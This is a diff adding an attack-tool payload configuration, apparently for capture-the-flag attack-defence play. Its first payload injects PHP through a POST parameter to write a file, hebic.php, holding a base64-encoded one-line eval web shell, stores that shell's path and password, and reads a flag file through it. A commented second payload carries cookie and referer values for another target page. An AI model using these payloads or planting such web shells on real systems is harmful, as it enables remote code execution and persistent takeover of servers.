@@ -1,0 +1,20 @@
+[payload1]
+method = POST
+getparam = /adtest/test1.php?a=action&c=controller
+User-Agent = tuzizhuishuaile
+postparam = param=file_put_contents("hebic.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs/Pg=="));&zzz=aaa
+webshellreturn = true
+webshellpath = /adtest/hebic.php
+webshellpass = homaebic
+signal =
+readflag = echo file_get_contents("c:/temp/1.txt");
+
+;[payload2]
+;method = GET
+;getparam = /adtest/test2.php
+;cookie = Syclover=tuzizhuishuaile, s=WHOAMI
+;Referer = http://localhost/install.php
+;webshellreturn = false
+;webshellpath =
+;webshellpass =
+;signal = flag{[a-fA-F0-9]{32}}
